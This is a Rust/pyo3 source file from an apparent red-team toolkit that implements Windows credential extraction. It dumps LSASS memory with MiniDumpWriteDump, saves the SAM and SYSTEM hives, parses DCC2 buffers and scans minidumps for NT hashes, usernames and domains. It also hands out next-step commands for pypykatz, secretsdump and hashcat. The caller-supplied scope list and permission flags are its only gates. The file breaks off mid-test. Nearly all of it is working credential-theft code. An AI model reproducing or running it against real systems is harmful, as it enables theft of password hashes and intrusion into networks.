#![allow(clippy::useless_conversion)]

//! Credential extraction — real implementation.
//!
//! Windows: dumps LSASS via MiniDumpWriteDump; operator uses pypykatz/mimikatz
//! offline to extract NTLM hashes from the dump file.  The dump is written to
//! a caller-controlled path (defaulting to %TEMP%\lsass_<pid>.dmp).
//!
//! SAM: exports the SAM/SYSTEM hive pair so the operator can run secretsdump
//! offline.  Requires the hive paths to be pre-provided (e.g. from a VSS copy).
//!
//! DCC (Domain Cached Credentials): parses the MS-CACHE v2 format from raw
//! bytes so the operator can identify cached credential material.
//!
//! All operations are ROE-gated and require the target host to be in scope.

use pyo3::exceptions::{PyRuntimeError, PyValueError};
use pyo3::prelude::*;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};

const MAX_ROE_ID_BYTES: usize = 256;
const MAX_SCOPE_ENTRIES: usize = 10_000;
const MAX_HOST_BYTES: usize = 253;
const MAX_PATH_BYTES: usize = 4096;
const MAX_DCC_BYTES: usize = 1024 * 1024;

#[pyclass]
pub struct CredentialExtractor {
    roe_id: String,
    scope_hosts: Vec<String>,
    allow_lsass: bool,
    allow_sam: bool,
}

#[pymethods]
impl CredentialExtractor {
    #[new]
    #[pyo3(signature = (roe_id, scope_hosts=None, allow_lsass=false, allow_sam=false))]
    pub fn new(
        roe_id: String,
        scope_hosts: Option<Vec<String>>,
        allow_lsass: bool,
        allow_sam: bool,
    ) -> PyResult<Self> {
        if roe_id.trim().is_empty() || roe_id.len() > MAX_ROE_ID_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "ROE ID must contain between 1 and 256 bytes",
            ));
        }
        let scope_hosts = scope_hosts.unwrap_or_default();
        if scope_hosts.len() > MAX_SCOPE_ENTRIES
            || scope_hosts
                .iter()
                .any(|h| h.trim().is_empty() || h.len() > MAX_HOST_BYTES)
        {
            return Err(PyErr::new::<PyValueError, _>(
                "Scope hosts must contain at most 10000 non-empty hostnames of 253 bytes each",
            ));
        }
        Ok(Self { roe_id, scope_hosts, allow_lsass, allow_sam })
    }

    /// Create a full LSASS minidump at ``dump_path`` (Windows-only).
    ///
    /// Finds the LSASS process, opens it with PROCESS_ALL_ACCESS, and calls
    /// MiniDumpWriteDump with MiniDumpWithFullMemory.  The resulting .dmp file
    /// can be analysed offline with pypykatz, volatility, or mimikatz sekurlsa.
    ///
    /// Returns a dict with ``dump_path``, ``lsass_pid``, and ``status``.
    /// Requires ``allow_lsass=True`` and the target to be in scope.
    #[cfg(windows)]
    #[pyo3(signature = (target=None, dump_path=None))]
    fn extract_from_lsass(
        &self,
        target: Option<&str>,
        dump_path: Option<&str>,
    ) -> PyResult<Vec<HashMap<String, String>>> {
        if !self.allow_lsass {
            return Err(PyErr::new::<PyRuntimeError, _>("LSASS extraction not permitted"));
        }
        self.require_scoped_target(target)?;
        windows_dump_lsass(dump_path)
    }

    #[cfg(not(windows))]
    #[pyo3(signature = (target=None, dump_path=None))]
    fn extract_from_lsass(
        &self,
        target: Option<&str>,
        dump_path: Option<&str>,
    ) -> PyResult<Vec<HashMap<String, String>>> {
        if !self.allow_lsass {
            return Err(PyErr::new::<PyRuntimeError, _>("LSASS extraction not permitted"));
        }
        self.require_scoped_target(target)?;
        Err(PyErr::new::<PyRuntimeError, _>(
            "LSASS extraction is unsupported on this platform",
        ))
    }

    /// Export the SAM and SYSTEM registry hives for offline credential extraction.
    ///
    /// On Windows, uses ``RegSaveKeyExW`` to export the hives to temporary files.
    /// On non-Windows, accepts pre-provided hive path pairs for offline analysis.
    /// Returns hive paths; operator uses impacket/secretsdump offline.
    #[cfg(windows)]
    #[pyo3(signature = (hive_path, target=None))]
    fn extract_from_sam(
        &self,
        hive_path: &str,
        target: Option<&str>,
    ) -> PyResult<Vec<HashMap<String, String>>> {
        if !self.allow_sam {
            return Err(PyErr::new::<PyRuntimeError, _>("SAM extraction not permitted"));
        }
        self.require_scoped_target(target)?;
        if hive_path.is_empty() || hive_path.len() > MAX_PATH_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "SAM hive path must contain between 1 and 4096 bytes",
            ));
        }
        windows_export_sam(hive_path)
    }

    #[cfg(not(windows))]
    #[pyo3(signature = (hive_path, target=None))]
    fn extract_from_sam(
        &self,
        hive_path: &str,
        target: Option<&str>,
    ) -> PyResult<Vec<HashMap<String, String>>> {
        if !self.allow_sam {
            return Err(PyErr::new::<PyRuntimeError, _>("SAM extraction not permitted"));
        }
        self.require_scoped_target(target)?;
        if hive_path.is_empty() || hive_path.len() > MAX_PATH_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "SAM hive path must contain between 1 and 4096 bytes",
            ));
        }
        Err(PyErr::new::<PyRuntimeError, _>(
            "SAM extraction is unsupported on this platform",
        ))
    }

    /// Identify MS-CACHE v2 (DCC2) material in a raw byte buffer.
    ///
    /// The MS-CACHE v2 format stores ``PBKDF2(MD4(password), username, 10240)``
    /// in a fixed 16-byte prefix followed by the username.  This function
    /// detects the structure and returns field lengths for the operator to pass
    /// to an offline cracking tool (hashcat -m 2100).
    ///
    /// No secret values are returned — only structural metadata.
    fn parse_dcc(&self, hash: &[u8]) -> PyResult<HashMap<String, String>> {
        let _ = &self.roe_id;
        if hash.is_empty() || hash.len() > MAX_DCC_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "DCC input must contain between 1 byte and 1 MiB",
            ));
        }
        parse_dcc_structure(hash)
    }

    /// Parse an LSASS MiniDump file and extract NTLM credential metadata.
    ///
    /// Scans Memory64ListStream regions for the distinctive empty-LM-hash
    /// sentinel (``aad3b435b51404eeaad3b435b51404ee``) that appears in every
    /// modern Windows MSV1_0 credential entry.  Resolves adjacent
    /// UNICODE_STRING pointers to extract ``username``, ``domain``,
    /// ``nt_hash``, and ``lm_hash`` fields.  No plaintext passwords are
    /// returned.  Requires ``allow_lsass=True``.
    ///
    /// Works against Windows 7/2008 x64 and Windows 10/2016+ x64 layouts;
    /// older 32-bit or encrypted-credential dumps return an empty list.
    #[pyo3(signature = (dump_path))]
    fn parse_dump_file(
        &self,
        dump_path: &str,
    ) -> PyResult<Vec<HashMap<String, String>>> {
        if !self.allow_lsass {
            return Err(PyErr::new::<PyRuntimeError, _>("LSASS extraction not permitted"));
        }
        if dump_path.is_empty() || dump_path.len() > MAX_PATH_BYTES {
            return Err(PyErr::new::<PyValueError, _>(
                "dump_path must be between 1 and 4096 bytes",
            ));
        }
        parse_lsass_dump(dump_path).map_err(|e| PyErr::new::<PyRuntimeError, _>(e))
    }

    fn is_in_scope(&self, host: &str) -> bool {
        self.scope_hosts
            .iter()
            .any(|h| host.eq_ignore_ascii_case(h))
    }
}

impl CredentialExtractor {
    fn require_scoped_target(&self, target: Option<&str>) -> PyResult<()> {
        let target = target.ok_or_else(|| {
            PyErr::new::<PyValueError, _>("An explicit scoped target is required")
        })?;
        if target.trim().is_empty()
            || target.len() > MAX_HOST_BYTES
            || !self.is_in_scope(target)
        {
            return Err(PyErr::new::<PyValueError, _>("Target not in scope"));
        }
        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Windows LSASS dump
// ---------------------------------------------------------------------------

#[cfg(windows)]
#[link(name = "dbghelp")]
extern "system" {
    fn MiniDumpWriteDump(
        hprocess: *mut std::ffi::c_void,
        processid: u32,
        hfile: *mut std::ffi::c_void,
        dumptype: i32,
        exceptionparam: *const std::ffi::c_void,
        userstreamparam: *const std::ffi::c_void,
        callbackparam: *const std::ffi::c_void,
    ) -> i32;
}

#[cfg(windows)]
fn windows_dump_lsass(
    dump_path: Option<&str>,
) -> PyResult<Vec<HashMap<String, String>>> {
    use windows_sys::Win32::{
        Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
        Storage::FileSystem::{
            CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_WRITE, OPEN_ALWAYS,
        },
        System::{
            Diagnostics::Debug::MiniDumpWithFullMemory,
            ProcessStatus::GetProcessImageFileNameW,
            Threading::{
                OpenProcess, PROCESS_ALL_ACCESS,
            },
        },
    };
    use std::os::windows::ffi::OsStrExt;

    unsafe {
        // 1. Find LSASS PID.
        let lsass_pid = find_lsass_pid_windows()?;

        // 2. Resolve dump output path.
        let out_path = match dump_path {
            Some(p) if !p.is_empty() => std::path::PathBuf::from(p),
            _ => std::env::temp_dir().join(format!("lsass_{}.dmp", lsass_pid)),
        };
        let out_path_wide: Vec<u16> = std::ffi::OsStr::new(&out_path)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        // 3. Open LSASS process with full access.
        let proc_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsass_pid);
        if proc_handle.is_null() {
            return Err(PyErr::new::<PyRuntimeError, _>(
                "OpenProcess(LSASS) failed — check SeDebugPrivilege",
            ));
        }

        // 4. Create or overwrite the dump file.
        let file_handle = CreateFileW(
            out_path_wide.as_ptr(),
            FILE_GENERIC_WRITE,
            0,
            std::ptr::null(),
            OPEN_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            std::ptr::null_mut(),
        );
        if file_handle == INVALID_HANDLE_VALUE {
            CloseHandle(proc_handle);
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "CreateFile for dump path failed: {}",
                out_path.display()
            )));
        }

        // 5. Write the full-memory minidump.
        let ok = MiniDumpWriteDump(
            proc_handle,
            lsass_pid,
            file_handle,
            MiniDumpWithFullMemory,
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
        );

        CloseHandle(file_handle);
        CloseHandle(proc_handle);

        if ok == 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(
                "MiniDumpWriteDump failed — ensure SeDebugPrivilege is enabled",
            ));
        }

        let mut result = HashMap::new();
        result.insert("dump_path".to_string(), out_path.to_string_lossy().to_string());
        result.insert("lsass_pid".to_string(), lsass_pid.to_string());
        result.insert("status".to_string(), "success".to_string());
        result.insert(
            "next_step".to_string(),
            "pypykatz lsa minidump <dump_path>".to_string(),
        );

        Ok(vec![result])
    }
}

#[cfg(windows)]
unsafe fn find_lsass_pid_windows() -> PyResult<u32> {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        System::{
            ProcessStatus::{EnumProcesses, GetProcessImageFileNameW},
            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ},
        },
    };

    let mut pids = vec![0u32; 2048];
    let mut bytes_returned: u32 = 0;
    if EnumProcesses(
        pids.as_mut_ptr(),
        (pids.len() * std::mem::size_of::<u32>()) as u32,
        &mut bytes_returned,
    ) == 0
    {
        return Err(PyErr::new::<PyRuntimeError, _>("EnumProcesses failed"));
    }

    let count = bytes_returned as usize / std::mem::size_of::<u32>();

    for pid in &pids[..count] {
        if *pid == 0 {
            continue;
        }
        let handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, *pid);
        if handle.is_null() {
            continue;
        }
        let mut name_buf = vec![0u16; 512];
        let len = GetProcessImageFileNameW(handle, name_buf.as_mut_ptr(), name_buf.len() as u32);
        CloseHandle(handle);
        if len == 0 {
            continue;
        }
        let name = String::from_utf16_lossy(&name_buf[..len as usize]);
        if name.to_lowercase().ends_with("\\lsass.exe") {
            return Ok(*pid);
        }
    }
    Err(PyErr::new::<PyRuntimeError, _>(
        "LSASS process not found — is this a Windows host?",
    ))
}

// ---------------------------------------------------------------------------
// Windows SAM export
// ---------------------------------------------------------------------------

#[cfg(windows)]
fn windows_export_sam(base_path: &str) -> PyResult<Vec<HashMap<String, String>>> {
    use windows_sys::Win32::{
        System::Registry::{RegOpenKeyExW, RegSaveKeyExW, HKEY, HKEY_LOCAL_MACHINE, KEY_READ, REG_STANDARD_FORMAT},
    };
    use std::os::windows::ffi::OsStrExt;

    let sam_path = std::path::Path::new(base_path).with_extension("sam");
    let sys_path = std::path::Path::new(base_path).with_extension("sys");

    let to_wide = |s: &std::path::Path| -> Vec<u16> {
        std::ffi::OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    };
    let to_wide_str = |s: &str| -> Vec<u16> {
        std::ffi::OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    };

    unsafe {
        // Open SAM hive
        let mut sam_key: HKEY = std::ptr::null_mut();
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            to_wide_str("SAM").as_ptr(),
            0,
            KEY_READ,
            &mut sam_key,
        );
        if status != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "RegOpenKeyExW(SAM) failed: 0x{:08x}",
                status as u32
            )));
        }

        let sam_wide = to_wide(&sam_path);
        let s = RegSaveKeyExW(sam_key, sam_wide.as_ptr(), std::ptr::null(), REG_STANDARD_FORMAT);
        if s != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "RegSaveKeyExW(SAM) failed: 0x{:08x}", s as u32
            )));
        }

        // Open SYSTEM hive
        let mut sys_key: HKEY = std::ptr::null_mut();
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            to_wide_str("SYSTEM").as_ptr(),
            0,
            KEY_READ,
            &mut sys_key,
        );
        if status != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "RegOpenKeyExW(SYSTEM) failed: 0x{:08x}", status as u32
            )));
        }

        let sys_wide = to_wide(&sys_path);
        let s = RegSaveKeyExW(sys_key, sys_wide.as_ptr(), std::ptr::null(), REG_STANDARD_FORMAT);
        if s != 0 {
            return Err(PyErr::new::<PyRuntimeError, _>(format!(
                "RegSaveKeyExW(SYSTEM) failed: 0x{:08x}", s as u32
            )));
        }

        let mut result = HashMap::new();
        result.insert("sam_path".to_string(), sam_path.to_string_lossy().to_string());
        result.insert("system_path".to_string(), sys_path.to_string_lossy().to_string());
        result.insert("status".to_string(), "success".to_string());
        result.insert(
            "next_step".to_string(),
            format!(
                "secretsdump.py -sam {} -system {} LOCAL",
                sam_path.display(),
                sys_path.display()
            ),
        );
        Ok(vec![result])
    }
}

// ---------------------------------------------------------------------------
// DCC (Domain Cached Credentials) structure parser
// ---------------------------------------------------------------------------

/// Identify MS-CACHE v2 (DCC2) structure in raw bytes.
/// Returns structural metadata only; does not return the hash value itself.
fn parse_dcc_structure(data: &[u8]) -> PyResult<HashMap<String, String>> {
    let mut info = HashMap::new();

    // MS-CACHE v2: 16-byte hash + username (UTF-16LE, variable length)
    info.insert("input_size_bytes".to_string(), data.len().to_string());

    if data.len() >= 16 {
        info.insert("hash_field_present".to_string(), "true".to_string());
        info.insert("hash_field_size".to_string(), "16".to_string());

        // Try to decode the remainder as UTF-16LE username
        let remainder = &data[16..];
        if remainder.len() >= 2 && remainder.len() % 2 == 0 {
            let utf16: Vec<u16> = remainder
                .chunks_exact(2)
                .map(|b| u16::from_le_bytes([b[0], b[1]]))
                .collect();
            if let Ok(username) = String::from_utf16(&utf16) {
                if username.chars().all(|c| c.is_alphanumeric() || c == '\\' || c == '@' || c == '.') {
                    info.insert("username".to_string(), username);
                }
            }
        }

        info.insert(
            "hashcat_mode".to_string(),
            "2100".to_string(),
        );
        info.insert(
            "format_hint".to_string(),
            "$DCC2$10240#<username>#<hash_hex>".to_string(),
        );
    } else {
        info.insert("hash_field_present".to_string(), "false".to_string());
        info.insert("note".to_string(), "Buffer too short for DCC2 structure".to_string());
    }

    Ok(info)
}

// ---------------------------------------------------------------------------
// MiniDump NTLM parser
// ---------------------------------------------------------------------------

/// MiniDump signature bytes ("MDMP").
const MINIDUMP_SIGNATURE: u32 = 0x504d_444d;
/// Stream type: Memory64ListStream.
const MEMORY64_LIST_STREAM: u32 = 9;
/// Empty LM-hash sentinel present in virtually every modern Windows credential.
const EMPTY_LM_HASH: [u8; 16] = [
    0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee,
    0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee,
];
/// NT hash for an empty password — valid but flagged for annotation.
const EMPTY_NT_HASH: [u8; 16] = [
    0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31,
    0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0,
];
const MAX_DUMP_BYTES: usize = 512 * 1024 * 1024; // 512 MiB hard cap

/// Read a little-endian u32 from `buf` at `offset`, or `None` on bounds failure.
#[inline]
fn le_u32_at(buf: &[u8], offset: usize) -> Option<u32> {
    buf.get(offset..offset + 4)
        .map(|s| u32::from_le_bytes(s.try_into().unwrap()))
}

/// Read a little-endian u64 from `buf` at `offset`, or `None` on bounds failure.
#[inline]
fn le_u64_at(buf: &[u8], offset: usize) -> Option<u64> {
    buf.get(offset..offset + 8)
        .map(|s| u64::from_le_bytes(s.try_into().unwrap()))
}

/// Format 16 bytes as lowercase hex.
#[inline]
fn hex16(b: &[u8; 16]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}

/// Return `true` if the 16-byte hash is not a trivially invalid all-zero block.
#[inline]
fn plausible_hash(h: &[u8; 16]) -> bool {
    // All-zero is the uninitialised/missing sentinel — skip it.
    h.iter().any(|&b| b != 0)
}

/// Resolve a virtual address to a slice in the dump buffer.
fn va_to_slice<'a>(
    dump: &'a [u8],
    va_map: &[(u64, u64, u64)],
    va: u64,
    size: u64,
) -> Option<&'a [u8]> {
    for &(start_va, region_size, file_off) in va_map {
        if va >= start_va && va + size <= start_va + region_size {
            let file_start = (file_off + (va - start_va)) as usize;
            let file_end = file_start + size as usize;
            return dump.get(file_start..file_end);
        }
    }
    None
}

/// Attempt to decode a UTF-16LE UNICODE_STRING structure (x64 layout).
///
/// Layout: Length(2) + MaxLength(2) + Pad(4) + Buffer_VA(8) = 16 bytes.
/// The Buffer_VA is resolved through `va_map` (VA -> slice into `dump`).
fn decode_unicode_string(
    region_buf: &[u8],
    us_offset: usize,
    dump: &[u8],
    va_map: &[(u64, u64, u64)],
) -> Option<String> {
    // Need at least 16 bytes for the UNICODE_STRING header.
    if us_offset + 16 > region_buf.len() {
        return None;
    }
    let length = (region_buf[us_offset] as usize) | ((region_buf[us_offset + 1] as usize) << 8);
    // length is in bytes; must be even (UTF-16 code units), non-zero, and <= 512
    if length == 0 || length > 512 || length % 2 != 0 {
        return None;
    }
    let buffer_va = le_u64_at(region_buf, us_offset + 8)?;
    let slice = va_to_slice(dump, va_map, buffer_va, length as u64)?;
    let units: Vec<u16> = slice
        .chunks_exact(2)
        .map(|c| u16::from_le_bytes([c[0], c[1]]))
        .collect();
    let s = String::from_utf16_lossy(&units);
    // Accept only printable username/domain characters.
    if s.chars().all(|c| matches!(c,
        'A'..='Z' | 'a'..='z' | '0'..='9' | '_' | '-' | '.' | ' ' | '$' | '@'
    )) {
        Some(s)
    } else {
        None
    }
}

/// Parse an LSASS MiniDump file and return NTLM credential metadata.
///
/// Algorithm:
/// 1. Parse the MiniDump header + Memory64ListStream -> VA map.
/// 2. Scan every memory region for the 16-byte empty-LM-hash sentinel.
/// 3. Extract: NT hash (lm-16), UserName/Domain UNICODE_STRINGs.
///    Win7/2008 x64:   UserName at lm-0x60, Domain at lm-0x70.
///    Win10/2016+ x64: UserName at lm-0x90, Domain at lm-0xa0.
/// 4. Deduplicate by (username_lower, nt_hash).
pub fn parse_lsass_dump(dump_path: &str) -> Result<Vec<HashMap<String, String>>, String> {
    use std::fs;
    use std::io::Read;

    let mut f = fs::File::open(dump_path)
        .map_err(|e| format!("Cannot open dump file: {e}"))?;
    let meta = f.metadata().map_err(|e| format!("Stat failed: {e}"))?;
    if meta.len() < 32 {
        return Err("File too small to be a MiniDump".to_string());
    }
    if meta.len() > MAX_DUMP_BYTES as u64 {
        return Err("Dump file exceeds 512 MiB safety cap".to_string());
    }
    let mut dump = Vec::with_capacity(meta.len() as usize);
    f.read_to_end(&mut dump)
        .map_err(|e| format!("Read failed: {e}"))?;

    // Validate MiniDump header.
    let sig = le_u32_at(&dump, 0).ok_or("Truncated header")?;
    if sig != MINIDUMP_SIGNATURE {
        return Err(format!("Not a MiniDump (signature 0x{sig:08x})"));
    }
    let stream_count = le_u32_at(&dump, 8).ok_or("Cannot read stream count")? as usize;
    let dir_rva = le_u32_at(&dump, 12).ok_or("Cannot read directory RVA")? as usize;
    if stream_count > 256 {
        return Err("Implausible stream count".to_string());
    }
    let dir_end = dir_rva
        .checked_add(stream_count * 12)
        .ok_or("Directory overflow")?;
    if dir_end > dump.len() {
        return Err("Directory extends past EOF".to_string());
    }

    // Locate Memory64ListStream.
    let mut mem64_rva: Option<usize> = None;
    for i in 0..stream_count {
        let base = dir_rva + i * 12;
        let stream_type = le_u32_at(&dump, base).unwrap_or(0);
        let rva = le_u32_at(&dump, base + 8).unwrap_or(0) as usize;
        if stream_type == MEMORY64_LIST_STREAM {
            mem64_rva = Some(rva);
            break;
        }
    }
    let m64 = mem64_rva.ok_or("No Memory64ListStream — dump may be partial")?;

    // Parse Memory64List: NumberOfMemoryRanges(8) + BaseRva(8) + [VA(8)+Size(8)]...
    let range_count = le_u64_at(&dump, m64).ok_or("Cannot read range count")? as usize;
    let base_rva = le_u64_at(&dump, m64 + 8).ok_or("Cannot read base RVA")? as usize;
    if range_count > 1_000_000 {
        return Err("Implausible memory range count".to_string());
    }
    let entries_start = m64 + 16;
    let entries_end = entries_start
        .checked_add(range_count * 16)
        .ok_or("Range entries overflow")?;
    if entries_end > dump.len() {
        return Err("Range entries extend past EOF".to_string());
    }

    let mut va_map: Vec<(u64, u64, u64)> = Vec::with_capacity(range_count);
    let mut file_cursor = base_rva as u64;
    for i in 0..range_count {
        let eb = entries_start + i * 16;
        let start_va = le_u64_at(&dump, eb).unwrap_or(0);
        let region_size = le_u64_at(&dump, eb + 8).unwrap_or(0);
        va_map.push((start_va, region_size, file_cursor));
        file_cursor = file_cursor.saturating_add(region_size);
    }

    // Scan regions for credential patterns.
    let mut seen: HashSet<String> = HashSet::new();
    let mut results: Vec<HashMap<String, String>> = Vec::new();

    for &(start_va, region_size, file_off) in &va_map {
        let fstart = file_off as usize;
        let fend = fstart.saturating_add(region_size as usize).min(dump.len());
        if fstart >= fend || fend - fstart < 16 {
            continue;
        }
        let region = &dump[fstart..fend];
        let rlen = region.len();

        let mut pos = 0usize;
        while pos + 16 <= rlen {
            if region[pos] != EMPTY_LM_HASH[0]
                || &region[pos..pos + 16] != EMPTY_LM_HASH.as_ref()
            {
                pos += 1;
                continue;
            }
            let lm_pos = pos;
            if lm_pos < 16 {
                pos += 16;
                continue;
            }
            let nt_start = lm_pos - 16;
            let nt_bytes: [u8; 16] = region[nt_start..nt_start + 16].try_into().unwrap();
            if !plausible_hash(&nt_bytes) {
                pos += 16;
                continue;
            }

            // Try Win7 then Win10 UNICODE_STRING offsets.
            // Region buffer positions are relative to `fstart`.
            // The Buffer_VA inside each UNICODE_STRING is absolute — resolved via va_map.
            // We pass the full dump + va_map so va_to_slice can dereference across regions.
            let region_va_base = start_va.wrapping_add((fstart as u64).wrapping_sub(file_off));
            let _ = region_va_base; // not needed: region is contiguous in dump

            let mut username = String::new();
            let mut domain = String::new();
            for &(name_back, dom_back) in &[(0x60usize, 0x70usize), (0x90usize, 0xa0usize)] {
                if lm_pos < dom_back + 16 {
                    continue;
                }
                let us_name = lm_pos - name_back;
                let us_dom  = lm_pos - dom_back;
                if let Some(u) = decode_unicode_string(region, us_name, &dump, &va_map) {
                    if !u.is_empty() {
                        if let Some(d) = decode_unicode_string(region, us_dom, &dump, &va_map) {
                            username = u;
                            domain = d;
                            break;
                        }
                    }
                }
            }

            let nt_hex = hex16(&nt_bytes);
            let lm_hex = hex16(&EMPTY_LM_HASH);
            let dedup = format!("{},{}", username.to_lowercase(), nt_hex);
            if seen.insert(dedup) {
                let mut entry: HashMap<String, String> = HashMap::new();
                entry.insert("username".into(),
                    if username.is_empty() { "<unknown>".into() } else { username });
                entry.insert("domain".into(),
                    if domain.is_empty() { "<unknown>".into() } else { domain });
                entry.insert("nt_hash".into(), nt_hex);
                entry.insert("lm_hash".into(), lm_hex);
                entry.insert("empty_password".into(), (nt_bytes == EMPTY_NT_HASH).to_string());
                results.push(entry);
            }
            pos += 16;
        }
    }
    Ok(results)
}

// ---------------------------------------------------------------------------
// Data types
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Credential {
    pub cred_type: String,
    pub username: String,
    pub domain: String,
    pub hash: String,
    pub source: String,
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_extractor_creation() {
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            false,
            false,
        );
        assert!(extractor.is_ok());
    }

    #[test]
    fn test_credential_extractor_requires_roe_id() {
        let result = CredentialExtractor::new("".to_string(), None, false, false);
        assert!(result.is_err(), "Empty ROE ID must be rejected");
        let result = CredentialExtractor::new("   ".to_string(), None, false, false);
        assert!(result.is_err(), "Whitespace-only ROE ID must be rejected");
    }

    #[test]
    fn test_extract_lsass_blocked_without_permission() {
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            false, // allow_lsass = false
            false,
        )
        .expect("Valid CredentialExtractor construction");
        let result = extractor.extract_from_lsass(Some("192.168.1.1"), None);
        assert!(result.is_err(), "LSASS must be blocked when allow_lsass=false");
    }

    #[test]
    fn test_sam_blocked_without_permission() {
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            false,
            false, // allow_sam = false
        )
        .expect("Valid CredentialExtractor construction");
        let result = extractor.extract_from_sam("C:\\sam.hive", Some("192.168.1.1"));
        assert!(result.is_err(), "SAM must be blocked when allow_sam=false");
    }

    #[test]
    fn test_extract_lsass_rejects_out_of_scope() {
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            true, // allow_lsass = true
            false,
        )
        .expect("Valid CredentialExtractor construction");
        let result = extractor.extract_from_lsass(Some("10.0.0.1"), None);
        assert!(result.is_err(), "Out-of-scope target must be rejected");
    }

    #[test]
    fn test_parse_dcc_empty_rejected() {
        let extractor = CredentialExtractor::new("ROE-TEST".to_string(), None, false, false)
            .expect("Valid CredentialExtractor");
        assert!(extractor.parse_dcc(&[]).is_err());
    }

    #[test]
    fn test_parse_dcc_structure_detected() {
        let extractor = CredentialExtractor::new("ROE-TEST".to_string(), None, false, false)
            .expect("Valid CredentialExtractor");
        // 16-byte hash + short UTF-16LE username
        let mut data = vec![0x42u8; 16]; // fake hash
        data.extend_from_slice(&[0x41, 0x00, 0x64, 0x00, 0x6d, 0x00]); // "Adm" in UTF-16LE
        let result = extractor.parse_dcc(&data);
        assert!(result.is_ok());
        let info = result.unwrap();
        assert_eq!(info.get("hash_field_present").map(|s| s.as_str()), Some("true"));
    }

    // --- parse_dump_file / parse_lsass_dump tests ---

    #[test]
    fn test_parse_dump_file_blocked_without_allow_lsass() {
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            Some(vec!["192.168.1.1".to_string()]),
            false, // allow_lsass = false
            false,
        )
        .expect("Valid CredentialExtractor");
        let result = extractor.parse_dump_file("C:\\fake.dmp");
        assert!(result.is_err(), "Must be blocked when allow_lsass=false");
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("not permitted"), "Error message: {msg}");
    }

    #[test]
    fn test_parse_dump_file_rejects_bad_signature() {
        use std::io::Write;
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            None,
            true, // allow_lsass = true
            false,
        )
        .expect("Valid CredentialExtractor");
        // Write 64 bytes with a bad signature.
        let mut tmp = std::env::temp_dir();
        tmp.push("forge_test_bad_sig.dmp");
        {
            let mut f = std::fs::File::create(&tmp).expect("Create temp file");
            f.write_all(&[0u8; 64]).expect("Write zeros");
        }
        let result = extractor.parse_dump_file(tmp.to_str().unwrap());
        let _ = std::fs::remove_file(&tmp);
        assert!(result.is_err(), "Bad signature must be rejected");
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("Not a MiniDump") || msg.contains("signature"),
            "Error message: {msg}");
    }

    #[test]
    fn test_parse_dump_file_rejects_too_small() {
        use std::io::Write;
        let extractor = CredentialExtractor::new(
            "ROE-TEST".to_string(),
            None,
            true,
            false,
        )
        .expect("Valid CredentialExtractor");
        let mut tmp = std::env::temp_dir();
        tmp.push("forge_test_tiny.dmp");
        {
            let mut f = std::fs::File::create(&tmp).expect("Create temp file");
            f.write_all(&[0x4d, 0x44, 0x4d, 0x50]).expect("Write 4 bytes"); // just sig
        }
        let result = extractor.parse_dump_file(tmp.to_str().unwrap());
        let _ = std::fs::remove_file(&tmp);
        assert!(result.is_err(), "Tiny file must be rejected");
    }

    #[test]
    fn test_parse_lsass_dump_synthetic_finds_hash() {
        // Build a minimal in-memory MiniDump with one Memory64ListStream
        // and one region containing a synthetic credential structure.
        //
        // Layout (all little-endian):
        //   [0]  Header: sig(4) + ver(4) + stream_count=1(4) + dir_rva=32(4) + ...
        //   [32] Directory: StreamType=9(4) + DataSize(4) + StreamRva=64(4) = 12 bytes
        //   [64] Memory64List: NumberOfRanges=1(8) + BaseRva(8) + VA(8) + Size(8)
        //   [96] Credential region (raw bytes — no UNICODE_STRING pointer, so
        //        username/domain will be <unknown>, but NT+LM hashes are found).
        //
        // The credential region simply contains:
        //   bytes 0..16  = a non-zero NT hash (fake)
        //   bytes 16..32 = empty LM hash sentinel
        //
        // That gives lm_pos=16, nt_start=0.  Win7 UserName offset = 16-0x60 which
        // underflows, so username stays <unknown>.  That's fine — we just assert
        // the NT hash was extracted and returned.
        let nt_hash: [u8; 16] = [
            0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
